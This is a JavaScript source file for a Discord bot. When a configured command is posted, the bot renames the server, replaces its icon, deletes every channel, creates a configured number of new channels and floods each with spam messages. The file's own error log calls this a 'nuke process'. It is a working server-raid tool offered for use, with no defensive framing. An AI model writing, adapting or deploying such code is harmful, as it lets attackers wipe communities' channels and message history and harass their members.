require('dotenv').config();
const { Client, GatewayIntentBits, Collection } = require('discord.js');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

const config = require('./config.json'); 

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

client.on('ready', () => {
    console.log(`${client.user.username} is online`);
});

client.login(process.env.token);

client.commands = new Collection();

const commandFiles = fs.readdirSync(path.join(__dirname, 'modules', 'commands')).filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
    const command = require(path.join(__dirname, 'modules', 'commands', file));
    client.commands.set(command.data.name, command);
}

const eventFiles = fs.readdirSync(path.join(__dirname, 'modules', 'events')).filter(file => file.endsWith('.js'));
for (const file of eventFiles) {
    const event = require(path.join(__dirname, 'modules', 'events', file));
    if (event.once) {
        client.once(event.name, (...args) => event.execute(...args, client));
    } else {
        client.on(event.name, (...args) => event.execute(...args, client));
    }
}

client.on('messageCreate', async message => {
    if (message.content === config.commands[0].name) { // Check command from config
        const guild = message.guild;

        try {
            console.log('Changing server name and icon...');
            await Promise.all([
                guild.setName(config.serverName),
                guild.setIcon(client.user.displayAvatarURL())
            ]);
            console.log('Server name and icon changed');

            console.log('Fetching all channels...');
            const channels = await guild.channels.fetch();

            console.log('Deleting channels...');
            const deletePromises = channels.map(channel => channel.delete());
            await Promise.allSettled(deletePromises);

            console.log('All channels have been deleted');

            console.log('Creating channels...');
            const createPromises = Array.from({ length: config.createChannels }, () =>
                guild.channels.create({
                    name: config.channelName,
                    type: 0
                }).catch(error => {
                    console.error('Failed to create a channel:', error);
                })
            );
            await Promise.all(createPromises);
            console.log(`${config.createChannels} channels have been created!`);

            console.log('Sending messages...');
            const newChannels = await guild.channels.fetch();
            const batchSize = 5;
            const sendPromises = [];

            newChannels.forEach(channel => {
                const channelSendPromises = [];
                for (let j = 0; j < config.messagesPerChannel; j++) {
                    const randomString = uuidv4().split('-')[0];
                    channelSendPromises.push(channel.send(`${config.messageContent}${randomString}`).catch(error => {
                        console.error(`Failed to send messages in channel ${channel.name}:`, error);
                    }));

                    if (channelSendPromises.length >= batchSize) {
                        sendPromises.push(Promise.all(channelSendPromises));
                        channelSendPromises.length = 0;
                    }
                }
                if (channelSendPromises.length > 0) {
                    sendPromises.push(Promise.all(channelSendPromises));
                }
            });

            await Promise.all(sendPromises);
            console.log(`Messages have been sent in all new channels.`);
        } catch (error) {
            console.error('Error during nuke process:', error);
        }
    }
});
